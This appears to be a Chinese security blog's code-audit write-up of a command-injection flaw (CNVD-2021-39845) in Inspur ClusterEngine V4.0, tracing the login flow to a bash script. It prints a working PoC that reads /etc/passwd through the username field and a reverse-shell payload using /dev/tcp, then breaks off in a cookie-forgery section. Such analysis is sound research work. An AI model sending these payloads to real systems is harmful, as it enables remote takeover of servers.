@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html>
+<style>
+.navbar-hide{
+	display: none;
+}
+</style>
+	<head>
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="© 关于哨兵，这是一个与哨兵安全相关的简述。">
+<meta name="keywords" content="网络安全,哨兵安全,Cyber Security,Open Source">
+<meta name="author" content="Sentry Security">
+<link rel="shortcut icon" href="/static/img/favicon.png">
+<title> 浪潮ClusterEngineV4.0代码审计历程  © 关于哨兵 | 哨兵安全实验室</title>
+<!--<base target="_blank" />-->
+<link rel="stylesheet" href="/static/css/bootstrap.css">
+<link rel="stylesheet" href="/static/css/bootstrap-select.min.css">
+<link rel="stylesheet" href="/static/css/font-awesome.min.css" >
+<link rel="stylesheet" href="/static/css/spinkit.css">
+<link rel="stylesheet" href="/static/css/style.css">
+<link rel="stylesheet" type="text/css" href="/static/css/pace-minimal.css">
+
+<script src="/static/js/jquery.min.js"></script>
+<!--jquery sticky js source files add-->
+<script src="/static/js/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+<script type="text/javascript" src="/static/js/jquery.sticky/1.0.4/jquery.sticky.js"></script>
+<!--jquery sticky js source files add stop-->
+<script src="/static/js/bootstrap.min.js"></script>
+<script src="/static/js/bootstrap-select.min.js"></script>
+<script src="/static/js/pace.min.js"></script>
+
+<!--start-->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$$','$$']]
+      }
+    });
+  </script>
+<script src="/static/js/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
+<!--https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js shuxue gongshi. stop-->
+
+<script src="/static/js/vue.min.js"></script>
+<script src="/static/js/timeago.min.js"></script>
+
+<script src="/static/js/markup.min.js"></script>
+<script src="/static/js/webfont.js"></script>
+<script src="/static/js/thuhidden.js"></script>
+
+</head>
+
+<body>
+	<div class="navbar navbar-default" role="navigation">
+  <div class="container">
+    <div class="navbar-header">
+      
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      
+			<a class="navbar-brand" href="/">
+				<span class="thuhidden">
+					
+					<picture>
+						
+						<source 
+						
+							srcset="/static/img/logo-small-dark.png 1x,
+											/static/img/logo-small-dark@2x.png 2x,
+											/static/img/logo-small-dark@3x.png 3x,
+											/static/img/logo-small-dark@4x.png 4x"
+						
+							media="(prefers-color-scheme: dark)"/>
+						
+						
+						<img src="/static/img/logo-small.png" 
+							srcset="/static/img/logo-small.png 1x, 
+											/static/img/logo-small@2x.png 2x, 
+											/static/img/logo-small@3x.png 3x, 
+											/static/img/logo-small@4x.png 4x"
+							alt=""/>
+						
+					</picture>
+					
+					</span>关于我的一些自述
+			</a>
+    </div>
+    <div class="navbar-collapse collapse navbar-right">
+      <ul class="nav navbar-nav" role="menubar">
+        
+        
+        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn">HOME</a></li>
+        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/blog">BLOG</a></li>
+        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/events">EVENT</a></li>
+        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/categories">CATEGORIES</a></li>
+        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/daily">DAILY</a></li>
+        <li class="active"><a href="/">ABOUT ME</a></li>
+
+        
+       
+      </ul>
+    </div><!--/.nav-collapse -->
+  </div>
+</div>
+
+
+
+
+<script>
+	window.mirrorId = "浪潮ClusterEngineV4.0代码审计历程";
+</script>
+
+
+<div id="help-page">
+	<div class="container">
+	  <div class="row">
+		  <div class="col-sm-3 hidden-xs">
+				<ul class="nav nav-pills nav-stacked" id="help-nav">
+					
+					<li id="toc-ATT&CK - 基于 scylla 的访问代理池"><a href="/help/Thousand-people-Thousand-faces-Red-team-penetration-agent-pool-based-on-scylla/"><code-index-css>ATT&CK - 基于 scylla 的访问代理池</code-index-css></a></li>
+					
+					<li id="toc-CTF - 代码审计向"><a href="/help/CTF-Code-Audit-WalkThrough/"><code-index-css>CTF - 代码审计向</code-index-css></a></li>
+					
+					<li id="toc-CTF - 密码学与杂项"><a href="/help/CTF-Crypto-and-Misc-etc-WalkThrough/"><code-index-css>CTF - 密码学与杂项</code-index-css></a></li>
+					
+					<li id="toc-Dynamic-analysis-of-java-framework-code"><a href="/help/Dynamic-analysis-of-java-framework-code/"><code-index-css>Dynamic-analysis-of-java-framework-code</code-index-css></a></li>
+					
+					<li id="toc-Hikvision-ConfigurationFiles-decrypter"><a href="/help/Hikvision-ConfigurationFiles-decrypter/"><code-index-css>Hikvision-ConfigurationFiles-decrypter</code-index-css></a></li>
+					
+					<li id="toc-JRMP-Gadget"><a href="/help/JRMP-Gadget/"><code-index-css>JRMP-Gadget</code-index-css></a></li>
+					
+					<li id="toc-Mod-Waf-Bypass-Walkthrough"><a href="/help/Mod-Waf-Bypass-Walkthrough/"><code-index-css>Mod-Waf-Bypass-Walkthrough</code-index-css></a></li>
+					
+					<li id="toc-ModSec & CloudFlare WAF Initial Research"><a href="/help/WAF-developed-by-Grayscale-forwarding/"><code-index-css>ModSec & CloudFlare WAF Initial Research</code-index-css></a></li>
+					
+					<li id="toc-Router-BinFile-Analysis"><a href="/help/Router-BinFile-Analysis/"><code-index-css>Router-BinFile-Analysis</code-index-css></a></li>
+					
+					<li id="toc-SQL注入原理分析"><a href="/help/ALL-SQL-INJECTION-ANALYSIS/"><code-index-css>SQL注入原理分析</code-index-css></a></li>
+					
+					<li id="toc-ShiroDeser"><a href="/help/ShiroDeser/"><code-index-css>ShiroDeser</code-index-css></a></li>
+					
+					<li id="toc-SpringBoot-Memory-files-heapdump-Analysis"><a href="/help/SpringBoot-Memory-files-heapdump-Analysis/"><code-index-css>SpringBoot-Memory-files-heapdump-Analysis</code-index-css></a></li>
+					
+					<li id="toc-Struts2Deser"><a href="/help/Struts2Deser/"><code-index-css>Struts2Deser</code-index-css></a></li>
+					
+					<li id="toc-javaDeser"><a href="/help/javaDeser/"><code-index-css>javaDeser</code-index-css></a></li>
+					
+					<li id="toc-polkit-CVE-2021-3560"><a href="/help/polkit-CVE-2021-3560/"><code-index-css>polkit-CVE-2021-3560</code-index-css></a></li>
+					
+					<li id="toc-基于内存的Shiro框架Webshell攻击研究"><a href="/help/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/"><code-index-css>基于内存的Shiro框架Webshell攻击研究</code-index-css></a></li>
+					
+					<li id="toc-安全与开发之：Maven构建排错"><a href="/help/ALL-mvn-build-errors/"><code-index-css>安全与开发之：Maven构建排错</code-index-css></a></li>
+					
+					<li class="active" id="toc-浪潮ClusterEngineV4.0代码审计历程"><a href="/help/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/"><code-index-css>浪潮ClusterEngineV4.0代码审计历程</code-index-css></a></li>
+					
+					<li id="toc-通达OA利用代码分析"><a href="/help/ToDa-OA-VulnPoc-by-java-analysis/"><code-index-css>通达OA利用代码分析</code-index-css></a></li>
+					
+				</ul>
+				
+				
+				<div id="sticky-wrapper" class="sticky-wrapper" style="height: 200px;">
+					<li class="nav nav-pills nav-stacked" id="help-nav">
+						<code-index-css>
+							<details open class="article-index" style="overflow: visible;">
+								<summary class="point">文章目录&nbsp &nbsp</summary>
+								<div class="hline"></div>
+								<div class="spacing"></div>
+								<ul id="toc" class="section-nav">
+<li class="toc-entry toc-h2"><a href="#cnvd-2021-39845---浪潮clusterengine-v40存在逻辑缺陷漏洞">CNVD-2021-39845 - 浪潮ClusterEngine V4.0存在逻辑缺陷漏洞</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#0x01远程代码执行">0x01：远程代码执行</a>
+<ul>
+<li class="toc-entry toc-h4"><a href="#参考">参考</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h3"><a href="#0x02cookie伪造登录">0x02：Cookie伪造登录</a></li>
+</ul>
+</li>
+</ul>
+							</details>
+						</code-index-css>
+					</li>
+				</div>
+				 
+
+
+				<!--click this icon -> scroll to top of page; code from anquanke. also this icon func are under-construction-->		
+				<!-- <div class="back-to-top" onclick="$(&quot;html,body&quot;).animate({scrollTop:0}, 500);" style="position: fixed;bottom:400px;right: 20px;height: 40px;width: 40px;background-color: #1dada7;border-radius: 50%;text-align: center;cursor: pointer">
+					<img src="https://p0.ssl.qhimg.com/t0179ac3294ef926b8c.png" style="width:30px;margin-top: 6px;">
+				</div> -->
+
+
+			</div><!-- sidenave -->
+			<div class="col-sm-9">
+				<div class="visible-xs">
+					<form class="form-inline">
+						<div class="form-group">
+							<label>选择: </label>
+							<select class="form-control" id="help-select">
+								
+								<option data-help-url="/help/Thousand-people-Thousand-faces-Red-team-penetration-agent-pool-based-on-scylla/" id="toc-ATT&CK - 基于 scylla 的访问代理池">ATT&CK - 基于 scylla 的访问代理池</option>
+								
+								<option data-help-url="/help/CTF-Code-Audit-WalkThrough/" id="toc-CTF - 代码审计向">CTF - 代码审计向</option>
+								
+								<option data-help-url="/help/CTF-Crypto-and-Misc-etc-WalkThrough/" id="toc-CTF - 密码学与杂项">CTF - 密码学与杂项</option>
+								
+								<option data-help-url="/help/Dynamic-analysis-of-java-framework-code/" id="toc-Dynamic-analysis-of-java-framework-code">Dynamic-analysis-of-java-framework-code</option>
+								
+								<option data-help-url="/help/Hikvision-ConfigurationFiles-decrypter/" id="toc-Hikvision-ConfigurationFiles-decrypter">Hikvision-ConfigurationFiles-decrypter</option>
+								
+								<option data-help-url="/help/JRMP-Gadget/" id="toc-JRMP-Gadget">JRMP-Gadget</option>
+								
+								<option data-help-url="/help/Mod-Waf-Bypass-Walkthrough/" id="toc-Mod-Waf-Bypass-Walkthrough">Mod-Waf-Bypass-Walkthrough</option>
+								
+								<option data-help-url="/help/WAF-developed-by-Grayscale-forwarding/" id="toc-ModSec & CloudFlare WAF Initial Research">ModSec & CloudFlare WAF Initial Research</option>
+								
+								<option data-help-url="/help/Router-BinFile-Analysis/" id="toc-Router-BinFile-Analysis">Router-BinFile-Analysis</option>
+								
+								<option data-help-url="/help/ALL-SQL-INJECTION-ANALYSIS/" id="toc-SQL注入原理分析">SQL注入原理分析</option>
+								
+								<option data-help-url="/help/ShiroDeser/" id="toc-ShiroDeser">ShiroDeser</option>
+								
+								<option data-help-url="/help/SpringBoot-Memory-files-heapdump-Analysis/" id="toc-SpringBoot-Memory-files-heapdump-Analysis">SpringBoot-Memory-files-heapdump-Analysis</option>
+								
+								<option data-help-url="/help/Struts2Deser/" id="toc-Struts2Deser">Struts2Deser</option>
+								
+								<option data-help-url="/help/javaDeser/" id="toc-javaDeser">javaDeser</option>
+								
+								<option data-help-url="/help/polkit-CVE-2021-3560/" id="toc-polkit-CVE-2021-3560">polkit-CVE-2021-3560</option>
+								
+								<option data-help-url="/help/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/" id="toc-基于内存的Shiro框架Webshell攻击研究">基于内存的Shiro框架Webshell攻击研究</option>
+								
+								<option data-help-url="/help/ALL-mvn-build-errors/" id="toc-安全与开发之：Maven构建排错">安全与开发之：Maven构建排错</option>
+								
+								<option data-help-url="/help/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/" selected id="toc-浪潮ClusterEngineV4.0代码审计历程">浪潮ClusterEngineV4.0代码审计历程</option>
+								
+								<option data-help-url="/help/ToDa-OA-VulnPoc-by-java-analysis/" id="toc-通达OA利用代码分析">通达OA利用代码分析</option>
+								
+							</select>
+						</div>
+					</form>
+				</div>
+				<div id="help-content">
+
+				<center>
+					
+					<csmall>本文最后修改于：<em>2021-05-21</em></csmall>
+					
+				<csmall><em> | Sentry Security | 哨兵安全实验室</em></csmall>
+				</center>
+
+					<div class="hline"></div>
+					<div class="spacing"></div>
+
+					<h2 id="cnvd-2021-39845---浪潮clusterengine-v40存在逻辑缺陷漏洞"><em>CNVD-2021-39845 - 浪潮ClusterEngine V4.0存在逻辑缺陷漏洞</em></h2>
+
+<ul>
+  <li>2021年 5月21日 星期日 00时11分58秒 CST
+    <ul>
+      <li>最近一直在看代码，正好前两天在网上冲浪的时候看到浪潮的一个RCE，就拿过来分析一下试试看</li>
+    </ul>
+  </li>
+  <li>2021年 5月31日 星期一 22时55分49秒 CST
+    <ul>
+      <li>上传相关代码至<a href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Inspur%20Cluster%20Engine%20v4/java%20code"><em>bigger-than-bigger</em>仓库：点击查看相关代码</a></li>
+    </ul>
+  </li>
+</ul>
+
+<p>先看<code class="language-plaintext highlighter-rouge">web.xml</code>定义的servlet；</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;servlet&gt;</span>
+    <span class="nt">&lt;servlet-name&gt;</span>login<span class="nt">&lt;/servlet-name&gt;</span>
+    <span class="nt">&lt;servlet-class&gt;</span>
+        com.inspur.tsce4.login.Servlet
+    <span class="nt">&lt;/servlet-class&gt;</span>
+<span class="nt">&lt;/servlet&gt;</span>
+</code></pre></div></div>
+<p>指向<code class="language-plaintext highlighter-rouge">com.inspur.tsce4.login.Servlet</code>类，直接去看login：<code class="language-plaintext highlighter-rouge">WEB-INF/classes/com/inspur/tsce4/login/Servlet</code>类：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Servlet</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="nf">Servlet</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doPost</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span> <span class="o">{</span>
+        <span class="n">request</span><span class="o">.</span><span class="na">setCharacterEncoding</span><span class="o">(</span><span class="s">"utf-8"</span><span class="o">);</span>
+        <span class="nc">Management</span> <span class="n">manage</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Management</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
+        <span class="n">manage</span><span class="o">.</span><span class="na">doResponse</span><span class="o">();</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">doPost</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>继承了HttpServlet，dopost方法调用Management：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Management</span> <span class="o">{</span>
+    
+    <span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">;</span>
+    <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">;</span>
+    <span class="nc">Command</span> <span class="n">command</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Command</span><span class="o">();</span>
+
+<span class="o">}</span>
+
+</code></pre></div></div>
+<p>我个人不太喜欢贴大段代码，自己写着累，看的人也累，因为代码只更像是我们生活中聊天时候的互动手势，一定是辅助作用而不是表达主题；于是我便大致画了一下我理解的web认证Java代码跳转逻辑，方便理解：</p>
+
+<p><img src="/static/web-image/inspur-CEV4-Code-audit/inspur-code-running-logic.png" alt="" /></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">command()</code> -&gt; 对应是运行服务器上的<code class="language-plaintext highlighter-rouge">user_auth.sh</code>脚本：
+    <ul>
+      <li><a href="https://github.com/Bin4xin/bigger-than-bigger/blob/master/CoVV/Inspur%20Cluster%20Engine%20v4/java%20code/userAuth.sh">点击以查看代码</a></li>
+      <li>来看看代码主要运行逻辑，主要为以下逻辑：
+  <img src="/static/web-image/inspur-CEV4-Code-audit/user-auth-logic.png" alt="" /></li>
+    </ul>
+  </li>
+</ul>
+
+<p>运行程序先判断传入参数个数紧 接着对第一个传入参数进行简单的特殊字符过后进行比对，代码如下：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">uname echo</span> <span class="nv">$1</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">""</span> <span class="s1">'{for(i=1;i&lt;=NF;i++){if ($i ~ /[a-zA-Z0-9_]/) {str=$i;str1=(str1 str)}}print str1}'</span>
+<span class="k">if</span> <span class="o">[</span> a<span class="s2">"</span><span class="nv">$uname</span><span class="s2">"</span>b <span class="o">!=</span> a<span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>b <span class="o">]</span><span class="p">;</span> <span class="k">then
+   </span><span class="nb">echo </span>the user <span class="nv">$1</span> format is illegal
+   <span class="nb">echo </span>error:1
+   <span class="nb">exit </span>1<span class="p">;</span>
+<span class="k">fi</span>
+
+<span class="c">#简单做了一个过滤实验，但是一对符号如() ''等都无法过滤</span>
+➜ <span class="nb">echo </span>a-d-c.<span class="se">\/</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">""</span> <span class="s1">'{for(i=1;i&lt;=NF;i++){if ($i ~ /[a-zA-Z0-9_]/) {str=$i;str1=(str1 str)}}print str1}'</span>
+adc
+
+</code></pre></div></div>
+<p>其中进行算法识别的代码只能在redhat系统运行，中文环境下的redhat系统<code class="language-plaintext highlighter-rouge">crypt</code>换成<code class="language-plaintext highlighter-rouge">加密</code>即可：</p>
+
+<p><code class="language-plaintext highlighter-rouge">encrypt=$(passwd -S root | sed -rn 's/.* (\w+) crypt.*/\1/p')</code></p>
+
+<p><a href=""> <i class="fa fa-hand-o-down"></i></a></p>
+
+<p><code class="language-plaintext highlighter-rouge">encrypt=$(passwd -S root | sed -rn 's/.* (\w+) 加密.*/\1/p')</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ docker run <span class="nt">-d</span> hjd48/redhat
+➜ docker <span class="nb">exec</span> <span class="nt">-it</span> c2739bba0d86 /bin/bash
+
+<span class="c">##redhat 6国内换源</span>
+bash-4.1# <span class="nb">cd</span> /etc/yum.repos.d/ <span class="o">&amp;&amp;</span> <span class="nb">mkdir </span>tmp <span class="o">&amp;&amp;</span> <span class="nb">mv</span> <span class="k">*</span>.repo tmp 
+bash-4.1# wget <span class="nt">-O</span> /etc/yum.repos.d/CentOS-Base.repo https://static.lty.fun/%E5%85%B6%E4%BB%96%E8%B5%84%E6%BA%90/SourcesList/Centos-6-Vault-Aliyun.repo
+
+<span class="c">##encrypt 获取过程</span>
+bash-4.1# <span class="nb">uname</span> <span class="nt">-a</span>
+Linux c2739bba0d86 5.10.25-linuxkit <span class="c">#1 SMP Tue Mar 23 09:27:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+bash-4.1# <span class="nb">cat</span> /etc/issue
+Red Hat Enterprise Linux Server release 6.3 <span class="o">(</span>Santiago<span class="o">)</span>
+Kernel <span class="se">\r</span> on an <span class="se">\m</span>
+
+bash-4.1# passwd <span class="nt">-S</span> root | <span class="nb">sed</span> <span class="nt">-rn</span> <span class="s1">'s/.* (\w+) 加密.*/\1/p'</span>
+SHA512
+
+<span class="c">##用户认证过程</span>
+bash-4.1# bash user_auth.sh root zanghun123
+root
+arootb
+arootb
+<span class="nv">$6$s8LxZk5w$VUlASup50b9gmquJS6BT6YhDGHwTZThCRQeXRi12bHq8gAgxhSuqO5R7Jwm6p62lEyL4na16tG21gtBV1KaOV</span><span class="nb">.</span>
+encrypt: SHA512
+s8LxZk5w
+passwd_shadow: <span class="nv">$6$s8LxZk5w$VUlASup50b9gmquJS6BT6YhDGHwTZThCRQeXRi12bHq8gAgxhSuqO5R7Jwm6p62lEyL4na16tG21gtBV1KaOV</span><span class="nb">.</span>
+passwd_t: <span class="nv">$6$s8LxZk5w$VUlASup50b9gmquJS6BT6YhDGHwTZThCRQeXRi12bHq8gAgxhSuqO5R7Jwm6p62lEyL4na16tG21gtBV1KaOV</span><span class="nb">.</span>
+<span class="nb">true</span>
+</code></pre></div></div>
+
+<h3 id="0x01远程代码执行">0x01：远程代码执行</h3>
+
+<p>用户认证的逻辑基本如此，我们可以看到在web应用层针对用户的认证就是bash代码进行用户哈希值比对的结果，是以这样的参数传入：<code class="language-plaintext highlighter-rouge">bash user_auth.sh $username $passwd</code></p>
+
+<p>所以就导致了RCE，原理也十分简单，我们在web层的传入<code class="language-plaintext highlighter-rouge">$username 和 $passwd </code>两个参数可控，Linux环境下对传入参数使用符号：<code> $ ` () </code> 进行变量替换即可：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1# cd touch-test/
+bash-4.1# ls
+bash-4.1# pwd
+/tmp/touch-test
+bash-4.1# $(touch id)
+bash-4.1# ls
+id
+bash-4.1# $(id)
+bash: uid=0(root): command not found
+</code></pre></div></div>
+<p>所以传入参数进行RCE即可；
+<img src="/static/web-image/inspur-CEV4-Code-audit/user_auth_rce.png" alt="" /></p>
+
+<p>poc代码：</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># POC测试(出现 root:x:0:0 则存在漏洞)
+
+op=login&amp;username=peiqi`$(cat /etc/passwd)`
+{"err":"/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\n","exitcode":1,"out":"the user peiqi does not exist\nerror:1\n"}
+
+# 反弹shell
+op=login&amp;username=peiqi`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)`
+
+</code></pre></div></div>
+
+<h4 id="参考">参考</h4>
+
+<ul>
+  <li><a href="https://github.com/hhroot/2021_Hvv/blob/main/%E6%B5%AA%E6%BD%AE%20ClusterEngineV4.0%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md">浪潮ClusterEngineV4.0 任意命令执行</a></li>
+</ul>
+
+<h3 id="0x02cookie伪造登录">0x02：Cookie伪造登录</h3>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">com.inspur.tsce4.Management.login() - Management.getCookie() - Management.loginOut()</code></li>
+</ul>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Management</span> <span class="o">{</span>
+<span class="kd">private</span> <span class="kt">void</span> <span class="nf">getCookie</span><span class="o">()</span> <span class="o">{</span>
+        <span class="nc">String</span> <span class="n">key</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"name"</span><span class="o">);</span>
+        <span class="nc">JSONObject</span> <span class="n">result</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">JSONObject</span><span class="o">();</span>
+        <span class="nc">Cookie</span><span class="o">[]</span> <span class="n">cookies</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">request</span><span class="o">.</span><span class="na">getCookies</span><span class="o">();</span>
+        <span class="nc">Cookie</span> <span class="n">cookie</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="nc">Cookie</span> <span class="n">userCookie</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="nc">Cookie</span> <span class="n">L_TIMES_cookie</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">cookies</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">cookies</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">cookies</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">key</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">cookie</span> <span class="o">=</span> <span class="n">cookies</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
+                <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">cookies</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"username"</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">userCookie</span> <span class="o">=</span> <span class="n">cookies</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
+                <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">cookies</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"L_TIMES"</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">L_TIMES_cookie</span> <span class="o">=</span> <span class="n">cookies</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+
+        <span class="k">if</span> <span class="o">(</span><span class="n">userCookie</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">key</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"username"</span><span class="o">))</span> <span class="o">{</span>
+            <span class="n">userCookie</span> <span class="o">=</span> <span class="n">cookie</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="k">if</span> <span class="o">(</span><span class="n">clearUserList</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="n">userCookie</span><span class="o">.</span><span class="na">getValue</span><span class="o">())</span> <span class="o">&amp;&amp;</span> <span class="n">userCookie</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">key</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"vertifyUser"</span><span class="o">))</span> <span class="o">{</span>
+            <span class="nc">Long</span> <span class="n">now</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="nc">Date</span><span class="o">()).</span><span class="na">getTime</span><span class="o">();</span>
+            <span class="nc">Long</span> <span class="n">addTime</span> <span class="o">=</span> <span class="o">((</span><span class="nc">Date</span><span class="o">)</span><span class="n">clearUserList</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">userCookie</span><span class="o">.</span><span class="na">getValue</span><span class="o">())).</span><span class="na">getTime</span><span class="o">();</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">now</span> <span class="o">-</span> <span class="n">addTime</span> <span class="o">&gt;</span> <span class="mi">43200000L</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">clearUserList</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="n">userCookie</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">addTime</span> <span class="o">-</span> <span class="nc">Long</span><span class="o">.</span><span class="na">parseLong</span><span class="o">(</span><span class="n">L_TIMES_cookie</span><span class="o">.</span><span class="na">getValue</span><span class="o">())</span> <span class="o">&gt;</span> <span class="mi">0L</span><span class="o">)</span> <span class="o">{</span>
+                <span class="nc">Cookie</span> <span class="n">cookieAuth</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Cookie</span><span class="o">(</span><span class="s">"vertifyUser"</span><span class="o">,</span> <span class="s">"false"</span><span class="o">);</span>
+                <span class="n">cookieAuth</span><span class="o">.</span><span class="na">setMaxAge</span><span class="o">(</span><span class="mi">43200</span><span class="o">);</span>
+                <span class="n">cookieAuth</span><span class="o">.</span><span class="na">setPath</span><span class="o">(</span><span class="s">"/"</span><span class="o">);</span>
+                <span class="n">cookieAuth</span><span class="o">.</span><span class="na">setHttpOnly</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="k">this</span><span class="o">.</span><span class="na">response</span><span class="o">.</span><span class="na">addCookie</span><span class="o">(</span><span class="n">cookieAuth</span><span class="o">);</span>
+                <span class="n">cookie</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">cookie</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">result</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"result"</span><span class="o">,</span> <span class="s">"true"</span><span class="o">);</span>
+                <span class="n">result</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"value"</span><span class="o">,</span> <span class="n">cookie</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
